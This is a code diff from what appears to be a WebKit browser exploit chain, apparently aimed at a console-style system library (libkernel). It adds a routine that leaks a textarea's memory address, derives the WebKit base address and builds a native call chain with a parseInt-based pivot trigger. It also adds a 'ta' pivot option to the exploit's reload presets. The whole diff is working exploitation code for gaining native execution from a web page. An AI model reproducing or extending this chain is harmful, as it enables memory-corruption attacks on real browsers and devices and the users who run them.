@@ -72,7 +72,7 @@ import {
 } from "./libkernel_resolve.js";
 import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
-import { prepCoreNative, captureFromCarrier, fireCoreGetpid, fireCoreNotify, bisectCoreTriggerLite } from "./core_native.js?v=core-6";
+import { fireCoreGetpid, fireCoreNotify, bisectCoreTriggerLite } from "./core_native.js?v=core-6";
 import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall, fireUsleep, fireNotify, firePivotSmoke,
     resolvePivotBuiltin, firePivotTrigger,
     firePivotGetpid,
@@ -90,7 +90,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js?v=nc-20250831r";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831r";
+const BUILD_ID = "rw-20250831s";
 
 function usePoopsNativePath() {
     return params.get("nativepath") === "poops";
@@ -4447,29 +4447,67 @@ async function loadNotifySk() {
     return notifySkModule;
 }
 
+/** parseInt + carrier textarea — same mainMf walk as poops (proven on HW). */
+function prepCoreParseInt(p, off, carrier) {
+    if (!carrier || !carrier.textarea)
+        throw new Error("core: carrier textarea missing");
+    const cap = captureMainMfForPrep(p, off, parseInt);
+    cap.pivotTrigger = parseInt;
+    cap.pivotBuiltinName = "parseint-core";
+    cap.pivotObj = carrier.textarea;
+    try {
+        cap.pivotCell = p.leakval(carrier.textarea);
+    } catch (e) {
+        if (Number.isFinite(carrier.textareaAddress) && carrier.textareaAddress > 0)
+            cap.pivotCell = parseAddr(carrier.textareaAddress.toString(16));
+        else
+            throw new Error("core: leakval(textarea) failed");
+    }
+    cap.path = (cap.path || "?") + "+textarea";
+
+    let webkitBase = chainWebkitBase(off);
+    if (!webkitBase) {
+        try {
+            webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
+        } catch (_) { }
+    }
+    if (!webkitBase && cap.nativeFn && off.wk_expm1_builtin)
+        webkitBase = cap.nativeFn.sub32(off.wk_expm1_builtin);
+    if (!webkitBase)
+        throw new Error("core: no webkitBase — Start must log WEBKIT-BASE");
+
+    const prep = prepNativeChain(p, off, webkitBase, cap);
+    prep.pivotObj = cap.pivotObj;
+    prep.pivotCell = cap.pivotCell;
+    prep._coreNative = true;
+    prep._cap = cap;
+    if (prep.keepAlive.indexOf(cap.pivotObj) < 0)
+        prep.keepAlive.push(cap.pivotObj);
+    if (prep.keepAlive.indexOf(carrier.textarea) < 0)
+        prep.keepAlive.push(carrier.textarea);
+    return prep;
+}
+
 /** Capture mainMf — ?nativepath=core for parseInt+textarea; poops for expm1 legacy. */
 function ensureNativePrep(p, off) {
     if (nativePrep) return nativePrep;
     const carrier = window._wkCarrier;
     const hookMode = pivotHookMode();
 
-    if (useCoreNativePath() && carrier) {
-        try {
-            nativePrep = prepCoreNative(p, off, carrier);
-            nativePrep._pinMainMf = nativePrep.mainMf;
-            nativePrep._pinMainOrig = nativePrep.mainOrig;
-            mark("NATIVE-PREP", "CORE parseInt+textarea path="
-                + (nativePrep._cap && nativePrep._cap.path || "?")
-                + " mainMf=" + nativePrep.mainMf
-                + " pivotCell=" + nativePrep.pivotCell
-                + " wb=" + nativePrep.webkitBase
-                + " hook=" + hookMode);
-            pinNativeRetain();
-            return nativePrep;
-        } catch (coreErr) {
-            mark("NATIVE-PREP-WARN", "core path failed: " + (coreErr.message || coreErr)
-                + " — fallback poops");
-        }
+    if (useCoreNativePath()) {
+        if (!carrier)
+            throw new Error("core path: no carrier — Start first");
+        nativePrep = prepCoreParseInt(p, off, carrier);
+        nativePrep._pinMainMf = nativePrep.mainMf;
+        nativePrep._pinMainOrig = nativePrep.mainOrig;
+        mark("NATIVE-PREP", "CORE parseInt+textarea path="
+            + (nativePrep._cap && nativePrep._cap.path || "?")
+            + " mainMf=" + nativePrep.mainMf
+            + " pivotCell=" + nativePrep.pivotCell
+            + " wb=" + nativePrep.webkitBase
+            + " hook=" + hookMode);
+        pinNativeRetain();
+        return nativePrep;
     }
 
     const pivot = usePoopsNativePath()
@@ -5856,6 +5894,7 @@ const NATIVE_OPTION_PRESETS = {
         native: "smoke",
         freshprep: true,
         nativeprep: false,
+        pivot: "ta",
     },
     "core-smoke": {
         groom: null,
@@ -5863,6 +5902,7 @@ const NATIVE_OPTION_PRESETS = {
         native: "smoke",
         freshprep: true,
         nativeprep: false,
+        pivot: "ta",
     },
     "2e-default": {
         groom: "384",
@@ -5953,6 +5993,9 @@ function applyNativeOptionsReload() {
 
     if (nativeprep) u.searchParams.set("nativeprep", "1");
     else u.searchParams.delete("nativeprep");
+
+    if (prof && prof.pivot) u.searchParams.set("pivot", prof.pivot);
+    else if (path === "core") u.searchParams.set("pivot", "ta");
 
     mark("NATIVE-RELOAD", u.pathname + "?" + u.searchParams.toString());
     renderOut();
